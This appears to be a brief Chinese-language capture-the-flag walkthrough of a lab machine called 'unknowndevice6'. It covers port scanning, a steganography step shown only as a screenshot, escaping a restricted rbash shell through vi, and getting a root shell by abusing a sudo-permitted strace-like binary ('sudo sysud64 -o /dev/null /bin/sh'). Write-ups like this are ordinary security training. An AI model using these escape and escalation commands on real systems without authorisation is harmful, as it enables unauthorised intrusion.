# unknowndevice6  
## 信息收集  
![20211016165419](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016165419.png)
查看到了其中的两个端口  
其中1337开启了python的 http.simpleserver  
## 获得权限  
### 图片隐写  
![20211016165512](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016165512.png)
### 绕过rbash   
vi的方式进行绕过rbash
vi a 
!/bin/bash  
在打开的bash当中导入PATH变量就行了  

export PATH=/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL


## 提权  
sudo -l 查看的代码是sysud64 类似于strace  
我们要做的就是将输出文件打印到 一个文件当中执行命令就行了  
```
sudo sysud64 -o /dev/null /bin/sh
```
![20211016165548](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016165548.png)
